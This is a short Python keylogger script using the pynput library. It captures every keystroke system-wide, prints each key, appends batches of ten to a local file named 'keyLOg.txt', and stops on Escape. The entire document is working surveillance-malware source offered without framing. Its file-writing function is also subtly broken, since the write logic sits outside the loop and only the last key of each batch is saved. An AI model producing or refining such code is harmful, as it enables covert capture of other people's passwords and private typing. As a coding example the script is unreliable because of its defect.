from pynput.keyboard import Key, Listener

count = 0   # Keeps count of user keystrokes
keys = []   # Place to store key strokes


# Records user keystrokes
def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


# Writes program to file
def write_file(keys):
    with open("keyLOg.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)


# Ends program when user presses escape
def on_release(key):
    if key == Key.esc:
        return False

# Collects events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()